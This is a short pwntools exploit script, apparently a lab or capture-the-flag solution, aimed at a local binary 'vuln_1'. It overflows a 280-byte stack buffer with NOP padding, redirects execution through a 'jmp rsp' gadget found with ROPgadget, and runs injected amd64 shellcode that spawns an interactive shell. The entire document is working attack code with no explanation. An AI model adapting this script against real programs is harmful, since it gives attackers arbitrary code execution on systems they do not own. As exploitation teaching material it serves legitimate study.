from pwn import *

# tell pwltools we're using 64 bit
context.update(arch="amd64")

shellcode = asm(shellcraft.amd64.linux.sh())

# Point to jump back to
saved_rip = 0x7fffffffdf40

# Overflow is 280, or 0x118
overflow_len = 280

NOPSLED = b'\x90' * overflow_len

# husky@ubuntu:~/Desktop/binary-exploitation-defenses-tsar/vuln_1$ ROPgadget --binary vuln_1
# ...
# 0x0000000000401154 : jmp rsp
# ...

jmp_rsp = 0x0000000000401154

# Construct Payload
payload = NOPSLED +  p64(jmp_rsp) + shellcode

p = process("./vuln_1")
#vuln_debug = attach(p, api=True)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()